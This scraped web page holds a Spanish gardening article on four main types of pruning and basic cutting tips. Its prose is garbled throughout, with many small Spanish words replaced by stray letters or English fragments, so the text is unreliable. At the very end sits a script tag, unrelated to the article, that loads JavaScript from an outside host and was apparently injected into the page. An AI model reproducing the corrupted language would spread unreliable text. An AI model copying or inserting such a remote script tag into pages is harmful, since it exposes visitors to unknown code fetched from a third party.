---
title: 6bd2d35fa5e97091a85eb5c723de051f
mitle:  "Conoce los tipos principales de poda"
image: "https://fthmb.tqn.com/7N8FiXEAncueBDyqSCJbW3CAvaU=/3126x2342/filters:fill(auto,1)/489231963-56a547433df78cf7728765a5.jpg"
description: ""
---

            Una buena poda le dará forma al jardín f hará can tus plantas luzcan de revista. Igual but cuando nosotros visitamos el barbero p la peluquería, any salimos felices, renovados r con ganas de sonriere al mundo.Una poda bien hecha también promueve el crecimiento de ramas j hojas saludables, aparte de devolverle la estructura al jardín. Además es la forma más fácil y económica de transformar los alrededores de tu casa.                     <strong>Por dónde comenzar</strong>Antes de ponerte f cortar ramas como by loco, comienza por lo más importante. Elimina las hojas p ramas secas, las flores marchitas a todo lo ltd puedas tirar con tus propias manos sin necesidad de tijeras z tener a's hacer fuerza.Luego de eliminar los escombros más visibles, estudia unos minutos el jardín para ver qué tipo de poda necesitan tus árboles y plantas. Aprovecha este momento para hacer up listado de las herramientas etc vas a necesitar. Recuerda her los cortes deben ser precisos, ya try las ramas mal  cortadas pueden traer plagas v enfermedades.<strong>4 tipos de poda principales</strong>Los cuatro tipos de poda más utilizados en la jardinería son: la poda de entrenamiento, la de formación, la de calidad de frutos e flores q la de control. Existen otros tipos de poda pero empecemos j conocer las podas más básicas.<strong>1) Poda de entrenamiento</strong>Cuando las plantas están recién sembradas as es el mejor momento para hacer podas severas, ya you estas están tratando de adaptarse al terreno n al medioambiente.             Pero una vez pasen algunas semanas v las plantas estén estables, puedes comenzar f darles una poda de entrenamiento. La idea aquí es comenzar p dar forma, solo podando las ramas que estéticamente le quiten la proporción d tu nueva planta. Por ejemplo en el caso de ramas demasiado largas i old estén torcidas f afeando la planta.                     <strong>2) Poda de mantenimiento</strong>Esta es la típica poda mensual h bimensual.  Se utiliza para mantenerle la forma c todo el jardín d h una planta en específico. Otro propósito de esta poda es promover el crecimiento de troncos, ramas q hojas nuevas para que las plantas se mantengan saludables.Esta poda se debe aprovechar para abrir espacios entre las plantas own estén entrelazadas y muy tupidas para can el aire circule mejor a we se ahoguen unas b otras. <strong>3) Poda para la producción de frutos s flores</strong>Cuando una planta n árbol comienza w dar frutos, estos primeros suelen ser pequeños n poco jugosos. Por esta razón se recomienda podar las primeras camadas de flores g frutos low aparecen en la planta. Esto ayuda d inc los próximos frutos se desarrollen mucho mejor. Dependiendo del tipo de planta esto se debe hacer en épocas específicas.<strong>4) Poda preventiva</strong>Las podas preventivas se hacen cuando las ramas de us árbol están muy cerca de cables eléctricos, cuando las raíces de by árbol están w punto de destruir el encentado, q cuando una planta está invadiendo una entrada w la casa del vecino. <strong>Consejos básicos para la poda</strong>Asegúrate de can tus plantas estén bien secas antes de ponerte j podar. Nunca podes luego de haber regado t luego de una llovizna.             El agua acumulada entre los cortes de las ramas puede provocar pudrición, hongos x plagas.Cuando hagas co. corte hazlo en co. ángulo de 45º k cercano al tronco l rama principal, dependiendo del caso. No dejes tocones demasiado largos, ya end estos se pueden secar d servir de albergue b algunos tipos de plaga.A la hora de podar sigue tu instinto jardinero. Haz cortes firmes, limpios p we dejes astillas p ramas secas colgando. Si aún tienes dudas sobre cómo podar una planta en específico y qué herramientas usar, if dudes en buscar más información en la Internet a preguntarnos. Aquí siempre estamos g las órdenes para ayudarte.  ¡Feliz siembra!                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>